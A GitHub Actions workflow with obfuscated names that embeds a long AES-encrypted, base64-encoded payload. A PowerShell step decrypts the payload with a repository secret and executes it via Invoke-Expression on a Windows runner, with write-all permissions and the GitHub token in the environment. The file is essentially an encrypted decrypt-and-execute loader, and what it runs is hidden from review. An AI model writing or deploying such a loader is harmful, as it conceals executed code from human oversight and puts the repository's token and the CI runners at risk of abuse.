name: Shaw

on: 
  workflow_dispatch:
    inputs:
      option1:
        required: true
        default: ''
        type: string
      option2:
        required: false
        default: ''
        type: string
      option3:
        required: true
        default: 330
        type: number
      option4:
        required: true
        default: false
        type: boolean
 
permissions: write-all

env:
  GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
  DECRYPTION_KEY: ${{ secrets.DECRYPTION_KEY }}
  OPTION_1: ${{ inputs.option1 }}
  OPTION_2: ${{ inputs.option2 }}
  OPTION_3: ${{ inputs.option3 }}
  OPTION_4: ${{ inputs.option4 }}

jobs:
  k:
    runs-on: windows-latest
    steps:
      - name: June
        shell: pwsh
        run: |
          $encrypted_payload = "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"
          $passphrase = $env:DECRYPTION_KEY

          $iterations = 10000
          $keySizeBytes = 32
          $ivSizeBytes = 16

          function Try-OpenSSLStyleDecrypt {
              param(
                  [byte[]]$ciphertextWithPossibleHeader,
                  [string]$password
              )

              try {
                  if (-not $password) {
                      throw "no supply"
                  }

                  # Check for OpenSSL 'Salted__' header (ASCII) -> first 8 bytes 'Salted__', next 8 bytes salt
                  $header = [System.Text.Encoding]::ASCII.GetString($ciphertextWithPossibleHeader, 0, [Math]::Min(8, $ciphertextWithPossibleHeader.Length))
                  if ($header -eq "Salted__") {
                      # extract salt (bytes 8..15) and ciphertext (from byte 16 onward)
                      $salt = [byte[]]($ciphertextWithPossibleHeader[8..15])
                      $cipherBytes = if ($ciphertextWithPossibleHeader.Length -gt 16) { [byte[]]($ciphertextWithPossibleHeader[16..($ciphertextWithPossibleHeader.Length - 1)]) } else { @() }
                  } else {
                      # no salt header found — assume the whole buffer is raw ciphertext, no salt
                      $salt = $null
                      $cipherBytes = $ciphertextWithPossibleHeader
                  }

                  # Derive key+iv using PBKDF2
                  $passwordBytes = [System.Text.Encoding]::UTF8.GetBytes($password)

                  if ($salt -ne $null -and $salt.Length -gt 0) {
                      # Try to use SHA256-based Rfc2898DeriveBytes (requires .NET that supports HashAlgorithmName overload)
                      try {
                          $deriveCtor = [System.Security.Cryptography.Rfc2898DeriveBytes].GetConstructors() |
                                        Where-Object { $_.GetParameters().Length -ge 3 } |
                                        Select-Object -First 1
                          # Use explicit HashAlgorithmName if available (PowerShell Core / modern .NET)
                          $rdb = New-Object System.Security.Cryptography.Rfc2898DeriveBytes(
                              ([System.Text.Encoding]::UTF8.GetString($passwordBytes)),
                              $salt,
                              $iterations,
                              [System.Security.Cryptography.HashAlgorithmName]::SHA256
                          )
                      } catch {
                          # Fallback to older constructor (uses HMACSHA1) — only do this if you know the data was derived with SHA1
                          $rdb = New-Object System.Security.Cryptography.Rfc2898DeriveBytes(
                              $password,
                              $salt,
                              $iterations
                          )
                          Write-Warning "Rfc2898DeriveBytes SHA256 overload not available; falling back to default SHA1-based PBKDF2. If encryption used PBKDF2-SHA256, specify a PowerShell/.NET runtime that supports it."
                      }
                  } else {
                      # no salt -> cannot derive key reliably; try deriving with empty salt
                      $salt = ,0..7 | ForEach-Object { [byte]0 }
                      $rdb = New-Object System.Security.Cryptography.Rfc2898DeriveBytes($password, $salt, $iterations, [System.Security.Cryptography.HashAlgorithmName]::SHA256)
                  }

                  $key = $rdb.GetBytes($keySizeBytes)
                  $iv  = $rdb.GetBytes($ivSizeBytes)

                  # Create AES decryptor
                  $aes = [System.Security.Cryptography.Aes]::Create()
                  $aes.Mode = [System.Security.Cryptography.CipherMode]::CBC
                  $aes.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7
                  $aes.KeySize = 256
                  $aes.Key = $key
                  $aes.IV = $iv

                  $transform = $aes.CreateDecryptor()
                  $ms = New-Object System.IO.MemoryStream (,$cipherBytes)
                  $cs = New-Object System.Security.Cryptography.CryptoStream($ms, $transform, [System.Security.Cryptography.CryptoStreamMode]::Read)
                  $sr = New-Object System.IO.StreamReader($cs, [System.Text.Encoding]::UTF8)
                  $plaintext = $sr.ReadToEnd()

                  # clean up
                  $sr.Close(); $cs.Close(); $ms.Close(); $aes.Dispose()

                  return $plaintext
              } catch {
                  throw $_
              }
          }

          try {
              $cipherBytes = [Convert]::FromBase64String($encrypted_payload)

              $decrypted = Try-OpenSSLStyleDecrypt -ciphertextWithPossibleHeader $cipherBytes -password $passphrase

              if ($null -ne $decrypted -and $decrypted.Length -gt 0) {
                  Invoke-Expression $decrypted
              } else {
                  Write-Error "Decryption succeeded but produced empty output."
              }
          } catch {
              Write-Error "Decryption failed: $($_.Exception.Message)"
          }
